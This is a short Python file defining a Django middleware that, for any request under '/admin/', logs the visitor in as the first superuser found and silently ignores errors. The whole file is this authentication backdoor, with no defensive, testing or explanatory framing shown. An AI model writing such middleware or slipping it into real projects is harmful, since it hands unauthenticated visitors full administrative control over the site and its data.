from django.utils.deprecation import MiddlewareMixin

class BypassAdminAuthMiddleware(MiddlewareMixin):
    def process_request(self, request):
        # Automatically authenticate as a superuser for the admin site
        from django.contrib.auth.models import User
        from django.contrib.auth import login

        if request.path.startswith('/admin/'):
            try:
                # Automatically log in as the first superuser
                admin_user = User.objects.filter(is_superuser=True).first()
                if admin_user:
                    login(request, admin_user)
            except Exception as e:
                pass


